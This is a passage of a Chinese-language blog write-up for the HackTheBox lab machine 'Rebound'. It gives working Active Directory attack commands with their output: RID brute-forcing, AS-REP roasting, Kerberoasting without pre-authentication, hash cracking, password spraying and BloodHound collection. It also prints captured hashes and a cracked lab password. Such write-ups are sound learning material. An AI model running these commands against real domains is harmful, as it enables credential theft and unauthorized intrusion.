<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Rebound - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Rebound 10.10.11.231                                                                                                              端口扫描windows域机器,没有web端口： 12345">
<meta property="og:type" content="article">
<meta property="og:title" content="Rebound - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2023/09/14/Rebound-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Rebound 10.10.11.231                                                                                                              端口扫描windows域机器,没有web端口： 12345">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091101.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091102.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091103.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091104.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091105.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091106.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091107.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091118.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091108.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091109.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091110.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091111.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091112.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091113.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091114.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091115.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091116.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091117.jpg">
<meta property="article:published_time" content="2023-09-14T01:58:00.000Z">
<meta property="article:modified_time" content="2024-04-01T02:58:07.392Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091101.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Rebound - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Rebound - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-09-14T01:58:00.000Z" itemprop="datePublished" class="page-time">
  2023-09-14
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Enum"><span class="post-toc-number">3.</span> <span class="post-toc-text">Enum</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SMB"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">SMB</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users-txt"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">users.txt</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ASREPRoast"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">ASREPRoast</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Kerberoasting"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">Kerberoasting</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Password-spraying"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">Password spraying</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LDAPmonitor"><span class="post-toc-number">4.</span> <span class="post-toc-text">LDAPmonitor</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BloodHound"><span class="post-toc-number">5.</span> <span class="post-toc-text">BloodHound</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#oorend-gt-SERVICEMGMT"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">oorend -&gt; SERVICEMGMT</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SERVICEMGMT-gt-winrm-svc"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">SERVICEMGMT -&gt; winrm_svc</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RemotePotato0"><span class="post-toc-number">7.</span> <span class="post-toc-text">RemotePotato0</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#tbrady"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">tbrady</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#GMSA"><span class="post-toc-number">8.</span> <span class="post-toc-text">GMSA</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#DELEGATOR"><span class="post-toc-number">9.</span> <span class="post-toc-text">DELEGATOR</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#secretsdump"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">secretsdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">10.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">11.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Rebound-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Rebound - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-09-14 09:58:00" datetime="2023-09-14T01:58:00.000Z"  itemprop="datePublished">2023-09-14</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Rebound" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Rebound</a></li>
<li>10.10.11.231</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091101.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>windows域机器,没有web端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.231</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 15:34 CST</span><br><span class="line">Nmap scan report for 10.10.11.231</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">Not shown: 989 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-11 14:35:09Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-09-11T14:36:02+00:00; +7h00m01s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-date: 2023-09-11T14:36:00+00:00; +7h00m01s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-date: 2023-09-11T14:36:02+00:00; +7h00m01s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-09-11T14:36:00+00:00; +7h00m01s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2023-09-11T14:35:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 104.59 seconds</span><br></pre></td></tr></table></figure>

<p>根据结果中的主机名添加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.231 rebound.htb dc01.rebound.htb dc01</span><br></pre></td></tr></table></figure>

<h1 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h1><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>smb开了guest访问，可以获取shares以及获取用户名,rid参数要设置大点:</p>
<ul>
<li>Enumerate users by bruteforcing RID - CrackMapExec ~ CME WIKI<br><a href="https://www.crackmapexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid" target="_blank" rel="noopener">https://www.crackmapexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poetry run crackmapexec smb rebound.htb -u guest -p '' --shares --rid-brute 10</span><br><span class="line">000</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091102.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="users-txt"><a href="#users-txt" class="headerlink" title="users.txt"></a>users.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rebound\Administrator</span><br><span class="line">rebound\Guest</span><br><span class="line">rebound\krbtgt</span><br><span class="line">rebound\DC01$</span><br><span class="line">rebound\ppaul</span><br><span class="line">rebound\llune</span><br><span class="line">rebound\fflock</span><br><span class="line">rebound\jjones</span><br><span class="line">rebound\mmalone</span><br><span class="line">rebound\nnoon</span><br><span class="line">rebound\ldap_monitor</span><br><span class="line">rebound\oorend</span><br><span class="line">rebound\winrm_svc</span><br><span class="line">rebound\batch_runner</span><br><span class="line">rebound\tbrady</span><br><span class="line">rebound\delegator$</span><br></pre></td></tr></table></figure>

<h2 id="ASREPRoast"><a href="#ASREPRoast" class="headerlink" title="ASREPRoast"></a>ASREPRoast</h2><p>使用已经得到的用户名字典尝试进行ASREPRoast，得到jjones：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poetry run crackmapexec ldap rebound.htb -u /Users/miao/use_miao_wwwwwww/Hacking/HackTheBox/Rebound/users.txt -p '' --asreproast output.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">krb5asrep<span class="variable">$23</span><span class="variable">$jjones</span>@REBOUND.HTB:7e7f506c6928df77a9bd7733fbd8f8a8<span class="variable">$1227bc96041299801af7fc0ee83c4d0a81daf7dd1fca139b7c78089182f9d1695ca70b0ed70ae9935858375e4ae06be2ee9d98fe1ce0d3e1e84ce09f3c29d64ae0ae8d57c53c17345567fd175110eedc41256b04cbaabf71fa9a7d17c15ba0034d9da0d60fa884a7904310280f7e3857bafa4b87bc8fe62caab85aeb19d677a1c9c59abd01e5b44fe5443888020e0a50f6a5faecd029c296d87f89ab42e513bf63700b0bd5c97d3c306863617d7b7695d9816c2d2fe86bf07a894081eced3ee6a4a672139681f0bf37f10ede0cd7531a50e9e2522630e0a6eaf8ffd2a80510c3f931ab31b10b86316bb5</span></span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091103.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>但破解不出来密码</p>
<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>虽然破解不出来密码，但Rubeus有一个nopreauth参数，可以利用已知的jjones来进行Kerberoasting,impacket也有一个实现，但没合并到官方分支：</p>
<ul>
<li>GhostPack/Rubeus: Trying to tame the three-headed dog.<br><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></li>
<li>Kerberoast - The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/kerberos/kerberoast</a></li>
<li>Support for Kerberoasting without pre-authentication and ST request through AS-REQ by ShutdownRepo · Pull Request #1413 · fortra/impacket<br><a href="https://github.com/fortra/impacket/pull/1413" target="_blank" rel="noopener">https://github.com/fortra/impacket/pull/1413</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的users.txt里面只有用户名，没有域名</span></span><br><span class="line">Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:dc01.rebound.htb  /ldaps /spns:users1.txt /nowrap</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">krb5tgs<span class="variable">$23</span>$*ldap_monitor<span class="variable">$rebound</span>.htb<span class="variable">$ldap_monitor</span>*<span class="variable">$C61B3780196088C1D881ED1F062A55A5</span><span class="variable">$B60745B9F1037249C3B3451980FFFE544DF000B7F0F35365A0A80CCD396CAA8F6582E13BBCA7AF25A74A77AF98F17223728042B49AECCC8D2FDC3E1829F1936266CF66B655F4FD5F5582D2FADD9C5E97AD1006406C93C4F47D2F4F2B315BB765C0A933EE1221691D4CC75416BECEC34B31FD2A341AB50474716EF764AD2030E2140C53E9087C65A3942A5F0B9C8E4382F0CF99266E0DBA724257DDB88B280CD577D5C8A61E57A2F066B7CD076C37B651C80BCA4FAF2030808A9C9059901B09C856D717EB15F7BF1F93CCB8340DE47ADE630D95943725E2588A6AFA7F6BCF66467C525C608B9BC322C8CA0AE980824753943CEDEE749A5DF1E8A33D79058F872ACD18D8B232B6DF6C958AF758C01863FD3F182CF48F547060B7FBBBFFE50718A4E26CF3667A20F9D75B2A55FFB760F42EC685ACB2FE56FC75848AAE41AB57992EFD41DDB1CC8F9CEF54C6F27C7F2130C1B4EDB824C9577961ED748F093B175EB13D018262E7DA3090DB9D2CE66B08DC0942C48A0545A46D20392B84F48912C04C15CDE94B44E29E308BCABCD2A7A7F10F54EB7EB7FBBF93B788398BC1DCA9ED40233DB5C307244D248CAA1F3A2C00AD260B99A844BB368B74221AE4FB13E5632B1581D2F70F4645BA8E517B851C183BE1035C8D29120FE1711D90F3EA2E30D3B56BC49921938029BA1A5E8E65314EF8F17CEAD0798B8B7BF7A8D1023563978DDD06BC5C22576293D42C92A08B3868BF2C5971F04CED41C8B7F7C31E0AEB467D082780F551052270101E68D3DAE9CD49CA58CCFF4C9AF250718D4D0B349BE551DA81A06872C176C5D26E5BA41045D63FD691F234B7706299813EE8AAB8608812F66F627E896C853BE320D2101FAFBCF34A66C4437BF362DC4DBFC4E298D922BA7E35FA6A60369C595AFA7A843CD57BC0D5F8446414E256B4FE8E073DDA65E8BD8DD48C209C13FCE4D7FB4731D669D78099E163104698D1CB52600EC7258170E1ED2683D63F654E49239834742968AFC1B5D9621542FB421C1B0279E56B565C66FAFD02E1A9953D0AC04B2A8ED4B597C36392A652314C311E8F5C6C9442D17B8E2F0958EC59A73F63B1DB9628A303D9045DEB99DC0D0648D2F99F57B9964BCB2C0B7DDCB27BA6DEC7395D4BF2245EF7D801952E94EEF8AC6E62648E4343372D200E178EE1258F35FC69233250F5744C3329EFFFC481BBE6F10400A4145E0F5260615874F9B06AC212B3CD76C94BB4A035FE28F2D54C4D882DA918547D7706F3E87BDB0F5E837A757E5FB9A2DBE9B3CC9BB5A3B9E639173BD1C7DF697A6472D2A7FD66F57ACBEEE38565214CAEF922F4D2CF1D8B</span></span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091104.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ldap_monitor可以破解出密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">1GR8t@$</span><span class="bash"><span class="variable">$4u</span></span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091105.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="Password-spraying"><a href="#Password-spraying" class="headerlink" title="Password spraying"></a>Password spraying</h2><p>使用得到的密码进行Password spraying还能发现oorend也是这个密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的字典又要完整的FQDN，像这样</span></span><br><span class="line">rebound.htb\Administrator</span><br><span class="line"></span><br><span class="line">poetry run crackmapexec smb dc01.rebound.htb -u /Users/miao/use_miao_wwwwwww/Hacking/HackTheBox/Rebound/users2.txt -p '1GR8t@$$4u' --continue-on-success</span><br><span class="line"></span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u</span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091106.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="LDAPmonitor"><a href="#LDAPmonitor" class="headerlink" title="LDAPmonitor"></a>LDAPmonitor</h1><p>根据得到的用户名，下一步进行LDAPmonitor，需要kerberos认证：</p>
<ul>
<li>p0dalirius/LDAPmonitor: Monitor creation, deletion and changes to LDAP objects live during your pentest or system administration!<br><a href="https://github.com/p0dalirius/LDAPmonitor" target="_blank" rel="noopener">https://github.com/p0dalirius/LDAPmonitor</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate -s dc01.rebound.htb</span><br><span class="line">impacket-getTGT rebound.htb/ldap_monitor:'1GR8t@$$4u'</span><br><span class="line">export KRB5CCNAME=ldap_monitor.ccache</span><br><span class="line">python3 pyLDAPmonitor.py -d rebound.htb -u ldap_monitor -p '' -k --use-ldaps --dc-ip 10.10.11.231</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023091107.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>看起来winerm_svc和batch_runner两个用户定期几分钟改一次密码</p>
<h1 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h1><p>现在有有效的账号密码组合，然后就可以收集信息继续分析：</p>
<ul>
<li>dirkjanm/BloodHound.py: A Python based ingestor for BloodHound<br><a href="https://github.com/dirkjanm/BloodHound.py" target="_blank" rel="noopener">https://github.com/dirkjanm/BloodHound.py</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 需要同步时间</span></span><br><span class="line">sudo ntpdate -s dc01.rebound.htb</span><br><span class="line"></span><br><span class="line">bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -ns 10.10.11.231 -d rebound.htb  -c All</span><br></pre></td></tr></table></figure>

<h2 id="oorend-gt-SERVICEMGMT"><a href="#oorend-gt-SERVICEMGMT" class="headerlink" title="oorend -&gt; SERVICEMGMT"></a>oorend -&gt; SERVICEMGMT</h2><p>bloodhound并没有看到有用的信息,但手工枚举是可以看到有权限的：</p>
<ul>
<li>aniqfakhrul/powerview.py: Just another Powerview alternative<br><a href="https://github.com/aniqfakhrul/powerview.py" target="_blank" rel="noopener">https://github.com/aniqfakhrul/powerview.py</a></li>
<li>Self Exploit - Undergrad CyberSec Notes<br><a href="https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self" target="_blank" rel="noopener">https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/self</a></li>
</ul>
